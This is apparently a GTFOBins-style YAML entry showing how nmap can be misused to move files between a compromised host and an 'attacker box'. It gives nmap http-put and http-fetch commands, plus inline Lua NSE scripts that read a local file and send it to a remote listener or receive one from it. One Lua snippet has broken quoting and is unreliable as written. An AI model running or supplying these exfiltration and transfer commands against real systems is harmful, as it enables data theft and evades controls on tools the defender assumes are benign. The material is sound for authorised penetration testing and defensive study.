---
functions:
  file-upload:
    - description: Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
      code: |
        nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
    - description: Send a local file via TCP. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file.
      code: |
        TF=$(mktemp)
        echo 'local f=io.open(os.getenv("$LFILE"), 'rb')
        local d=f:read("*a")
        io.close(f);
        local s=require("socket");
        local t=assert(s.tcp());
        t:connect(os.getenv("$RHOST"),os.getenv("$RPORT"));
        t:send(d);
        t:close();' > $TF
        nmap --script=$TF
  file-download:
    - description: Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
      code: |
        TF=$(mktemp -d)
        LFILE=file_to_save
        nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
    - description: Fetch a remote file via TCP. Run `nc target.com 4444 < "file_to_send"` on the attacker box to send the file.
      code: |
        TF=$(mktemp)
        echo 'local k=require("socket");
        local s=assert(k.bind("*",os.getenv("LPORT")));
        local c=s:accept();
        local d,x=c:receive("*a");
        c:close();
        local f=io.open(os.getenv("LFILE"), "wb");
        f:write(d);
        io.close(f);' > $TF
        nmap --script=$TF
---
